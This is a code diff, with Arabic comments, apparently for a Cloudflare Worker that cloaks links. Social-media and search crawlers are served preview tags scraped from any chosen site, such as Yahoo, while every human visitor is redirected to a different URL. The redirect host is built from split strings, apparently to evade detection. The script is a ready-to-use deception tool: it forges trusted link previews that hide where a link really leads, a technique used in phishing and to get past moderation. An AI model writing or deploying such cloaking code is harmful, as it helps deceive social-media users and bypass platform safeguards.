@@ -1,33 +1,71 @@
-<!DOCTYPE html>
-<html lang="en">
+export default {
+  async fetch(request, env, ctx) {
+    const url = new URL(request.url);
+    
+    // 1. استخراج الموقع المستهدف تلقائياً من الرابط بعد المتغير ?to=
+    let targetUrl = url.searchParams.get('to'); 
+    
+    const ua = request.headers.get("User-Agent") || "";
+    // فحص شامل لبوتات منصات التواصل الاجتماعي
+    const isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);
+
+    if (!targetUrl) {
+      targetUrl = "https://yahoo.com"; // الموقع الافتراضي في حال عدم كتابة رابط
+    }
+
+    // إصلاح صيغة الرابط المستهدف تلقائياً
+    if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
+      targetUrl = "https://" + targetUrl;
+    }
+
+    // 2. إذا كان زائر حقيقي: توجيه فوري وعشوائي إلى جوجل (نفس كودك الأصلي)
+    if (!isBot) {
+      const a = "goog"; const b = "le."; const c = "com/?"; const d = Math.ceil(Math.random() * 24);
+      return Response.redirect("https://" + a + b + c + d, 302);
+    }
+
+    // 3. إذا كان بوتاً: يقوم الخادم بسحب المعاينة الحقيقية من الموقع المكتوب في الرابط فوراً قبل أن يغادر البوت
+    try {
+      const response = await fetch(targetUrl, {
+        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
+      });
+      
+      const text = await response.text();
+      
+      // استخراج العنوان والميتا تاغز تلقائياً من الموقع المستهدف (ياهو، يوب ميل، إلخ)
+      const titleMatch = text.match(/<title[^>]*>([^<]+)<\/title>/i);
+      const title = titleMatch ? titleMatch[1].trim() : 'View Content';
+      
+      const getMeta = (prop) => {
+        const reg = new RegExp(`<meta[^>]*?(?:property|name)=["']${prop}["'][^>]*?content=["']([^"']+)["']|<meta[^>]*?content=["']([^"']+)["'][^>]*?(?:property|name)=["']${prop}["']`, 'i');
+        const match = text.match(reg);
+        return match ? (match[1] || match[2]) : '';
+      };
+
+      const ogTitle = getMeta('og:title') || title;
+      const ogDescription = getMeta('og:description') || 'Click to view content';
+      const ogImage = getMeta('og:image') || '';
+
+      // بناء صفحة المعاينة الفورية الحية للبوت
+      const html = `<!DOCTYPE html>
+<html>
 <head>
   <meta charset="utf-8">
-  <title>Google</title>
-
-  <!-- وسوم المعاينة الثابتة والمباشرة لبوت تويتر لفرض ظهور معاينة جوجل فوراً وبدون انتظار -->
-  <meta property="og:title" content="Google">
-  <meta property="og:description" content="Search the world's information, including webpages, images, videos and more.">
-  <meta property="og:image" content="https://google.com">
-  
+  <title>${title}</title>
+  <meta property="og:title" content="${ogTitle}">
+  <meta property="og:description" content="${ogDescription}">
+  <meta property="og:image" content="${ogImage}">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Google">
-  <meta name="twitter:description" content="Search the world's information, including webpages, images, videos and more.">
-  <meta name="twitter:image" content="https://google.com">
-
-  <!-- سكربت التحويل الفوري وعالي السرعة للزوار الحقيقيين -->
-  <script type="text/javascript">
-    (function() {
-      var ua = navigator.userAgent || "";
-      var isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);
-
-      // إذا كان مستخدماً حقيقياً، يتم نقله فوراً وعشوائياً إلى جوجل
-      if (!isBot) {
-        var a = "goog"; var b = "le."; var c = "com/?"; var d = Math.ceil(Math.random() * 24);
-        window.location.replace("https://" + a + b + c + d);
-      }
-    })();
-  </script>
+  <meta name="twitter:title" content="${ogTitle}">
+  <meta name="twitter:description" content="${ogDescription}">
+  <meta name="twitter:image" content="${ogImage}">
 </head>
-<body>
-</body>
-</html>
+<body></body>
+</html>`;
+
+      return new Response(html, { headers: { "Content-Type": "text/html;charset=UTF-8" } });
+    } catch (err) {
+      return new Response("Error loading preview", { status: 500 });
+    }
+  }
+};
